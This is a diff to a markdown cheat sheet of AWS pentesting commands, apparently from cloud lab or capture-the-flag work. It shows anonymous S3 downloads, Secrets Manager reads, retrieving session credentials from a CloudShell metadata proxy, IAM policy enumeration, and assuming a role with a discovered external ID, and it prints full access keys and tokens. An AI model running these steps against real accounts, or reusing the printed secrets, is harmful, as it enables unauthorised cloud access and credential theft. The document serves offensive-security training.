@@ -1010,7 +1010,7 @@ found: 10751350379
 found: 107513503799
 ```
 
-Find the bucket region with
+Easily find bucket regions with a curl
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ curl -I https://mega-big-tech.s3.amazonaws.com
@@ -1025,7 +1025,7 @@ Transfer-Encoding: chunked
 Server: AmazonS3
 ```
 
-To copy S3 files to the local system without using a browser
+You can copy S3 files to the local system without using a browser
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
@@ -1042,7 +1042,7 @@ Message:  Successful APPSYNC: 0 / 1
 Message:  Successful SECRETSMANAGER: 1 / 2
 ```
 
-And to dump permissions on a specific service
+This tool also allows dumping permissions for a specific service
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws-enumerator dump -services secretsmanager
@@ -1050,7 +1050,7 @@ And to dump permissions on a specific service
 ListSecrets
 ```
 
-To request secretsmanager to list secrets
+To call secretsmanager to list secrets
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws secretsmanager list-secrets
@@ -1064,7 +1064,7 @@ To request secretsmanager to list secrets
 <snip>
 ```
 
-To fetch a secret by name
+And to get a specific secret
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws secretsmanager get-secret-value --secret-id ext/cost-optimization
@@ -1079,10 +1079,139 @@ To fetch a secret by name
     "CreatedDate": "2023-08-04T17:19:28.512000-04:00"
 }
 ```
-To get credentials from metadata, including the session token 
+
+Cloudshell doesn't expose the real EC2 metadata IP, instead we can contact it via a local proxy. To get credentials from metadata, including the session token
+```
+[cloudshell-user@ip-10-132-50-112 ~]$ curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60"
+or9vBtyYCFsO2IMHgKffq0Kdzwk/syyNOA5iJCx5BNM=
+
+[cloudshell-user@ip-10-132-50-112 ~]$ curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: or9vBtyYCFsO2IMHgKffq0Kdzwk/syyNOA5iJCx5BNM="
+{
+        "Type": "",
+        "AccessKeyId": "ASIAWHEOTHRF6G2LNQPT",
+        "SecretAccessKey": "o9oJoJOFNqeyErKno4A0TmfKVYfdjokyOSZ8Ff+e",
+        "Token": "IQoJb3JpZ2luX2VjEAQaCXVzLWVhc3QtMSJHMEUCIQDbrI7eb+9M3TYRoOJD/1T8ocbK870YnLNJAi4vp/7crwIgB7VgaYYk7FxppNQ1NNTZkW34vWNphrawYrN8pCypyp0qgQMIrP//////////ARAAGgw0Mjc2NDgzMDIxNTUiDG3huk82EtXbGzxTUyrVAuE7JApdxWdN8Faqtz31XXTXVtndCgqGoA7/Blr15kz5qfDU5WaUokIUGn7EWB2TFM38FV73kdRVqe6M3uO33l/2b5uI7IET4Yzdk4zXIZB4ldS7+fLxz+eSwOiW8jw3+/MwHdFAotu6IHQ01RQWleuGVVMCcD5GZ7z71lUEoX8ad7cyoT7lbd0QeKukgpVfnbpAzwPJk+W2aqhD0MORMu+QTG01ygXmnzRdNI/+f4ja+XCNsfL9kzbRi2H1kXQnIwPCKnCaV2TOpk5zfa5lUMCiMYxsab4d60BvBDn5UY3bqKp7CuDhuCZb3V+uCRPKylJhEukee/9+1DyZVcnuqdnHXOMpbV3b00DIrL94okducl1WhOxEMpYK4+NKX5VxzAwZEDBWPksmbdYnqHBkLtKeo7QkHypV6kfL++CzBnW8giEpIqmXnIqzsmGriahRkdlNj7sHMN2jyscGOq0CqID1/VWsNHFTOuk1QHzNKNcjvBCaKJKHF4ElLfQ9wwVYjqkFXyjEQnjKo327veVp/npNFuUe4d8OUC0sxYnTZyIpKO7cB9VBJbqVdfB9S4GqtWVL447sKjTCZsJYhj3f7nmAEqg6BagP2SZ2RiMfMGmciXOd97RfYMXFuqYRfB5Kd5WY2Q4pMVPwxCoT2QYWJlFbEDYVvd76rXNfJ0T9jFmGD++hqQq1Z/MOy1328tojgVAlVVwVnMa6OIyuHr81lwegCZP/w3JYKyJ+Xq5V75tE97kG4wP6pGJyMEwnxwymrvl4q9bjkm2zDNRJiu/J8+2Pz5VVDS1jJdiQFpG3HoY2Jjd7Gk5pc3D+Jb0XTwgBs75MO71V7R54iRaaxZyPFDkC2OAYbKhHcsWbjw==",
+        "Expiration": "2025-10-17T19:35:10Z",
+        "Code": "Success"
+}
 ```
 
+To list policies attached to a user
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws iam list-attached-user-policies --user-name ext-cost-user
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "ExtCloudShell",
+            "PolicyArn": "arn:aws:iam::427648302155:policy/ExtCloudShell"
+        },
+        {
+            "PolicyName": "ExtPolicyTest",
+            "PolicyArn": "arn:aws:iam::427648302155:policy/ExtPolicyTest"
+        }
+    ]
+}
+```
 
+To get more info about it, this is useful to find the version
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest
+{
+    "Policy": {
+        "PolicyName": "ExtPolicyTest",
+        "PolicyId": "ANPAWHEOTHRF7772VGA5J",
+        "Arn": "arn:aws:iam::427648302155:policy/ExtPolicyTest",
+        "Path": "/",
+        "DefaultVersionId": "v4",
+        "AttachmentCount": 1,
+        "PermissionsBoundaryUsageCount": 0,
+        "IsAttachable": true,
+        "CreateDate": "2023-08-04T21:47:26+00:00",
+        "UpdateDate": "2023-08-06T20:23:42+00:00",
+        "Tags": []
+    }
+}
+```
+
+And finally, to read the policy document, which requires its version
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --version-id v4
+{
+    "PolicyVersion": {
+        "Document": {
+            "Version": "2012-10-17",
+            "Statement": [
+                {
+                    "Sid": "VisualEditor0",
+                    "Effect": "Allow",
+                    "Action": [
+                        "iam:GetRole",
+                        "iam:GetPolicyVersion",
+                        "iam:GetPolicy",
+                        "iam:GetUserPolicy",
+                        "iam:ListAttachedRolePolicies",
+                        "iam:ListAttachedUserPolicies",
+                        "iam:GetRolePolicy"
+                    ],
+                    "Resource": [
+                        "arn:aws:iam::427648302155:policy/ExtPolicyTest",
+                        "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess",
+                        "arn:aws:iam::427648302155:policy/Payment",
+                        "arn:aws:iam::427648302155:user/ext-cost-user"
+                    ]
+                }
+            ]
+        },
+        "VersionId": "v4",
+        "IsDefaultVersion": true,
+        "CreateDate": "2023-08-06T20:23:42+00:00"
+    }
+}
+```
+
+Examining a role, note how to requires passing an External ID if the action sts:AssumeRole is called
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws iam get-role --role-name ExternalCostOpimizeAccess
+
+{
+    "Role": {
+        "Path": "/",
+        "RoleName": "ExternalCostOpimizeAccess",
+        "RoleId": "AROAWHEOTHRFZP3NQR7WN",
+        "Arn": "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess",
+        "CreateDate": "2023-08-04T21:09:30+00:00",
+        "AssumeRolePolicyDocument": {
+            "Version": "2012-10-17",
+            "Statement": [
+                {
+                    "Effect": "Allow",
+                    "Principal": {
+                        "AWS": "arn:aws:iam::427648302155:user/ext-cost-user"
+                    },
+                    "Action": "sts:AssumeRole",
+                    "Condition": {
+                        "StringEquals": {
+                            "sts:ExternalId": "37911"
+                        }
+                    }
+                }
+            ]
+<snip>
+```
+
+And to call that action
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name ExternalCostOpimizeAccess --external-id 37911
+{
+    "Credentials": {
+        "AccessKeyId": "ASIAWHEOTHRF4T5VZBVZ",
+        "SecretAccessKey": "RvbakyfLNHKGnAl+18Gb6XGY8JiTMkNlTHzzFLQt",
+<snip>
 ```
 
 
